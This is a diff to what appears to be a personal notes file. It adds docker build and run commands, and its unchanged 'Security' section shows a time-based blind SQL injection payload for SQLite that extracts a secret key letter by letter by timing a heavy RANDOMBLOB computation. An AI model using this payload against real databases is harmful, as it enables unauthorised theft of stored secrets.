@@ -79,6 +79,10 @@ https://blog.oddbit.com/post/2019-06-17-avoid-rebase-hell-squashing-wi/
 
 Then you can see it on  http://localhost:8070/Index.html
 
+### Building a docker image with version and go inside
+`docker build --rm --tag image:0.0.1 .`
+`docker run -it image:0.0.1`
+
 ## Security
 `SELECT * from users where username='admin' and (CASE WHEN (substr(key, 1, 1) = 'a') then LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000)))) else 1 end); --`
 this basically checks if there is the specified letter in the key at a given position. if there is, we do some operation (use sleep if not sqlite3)
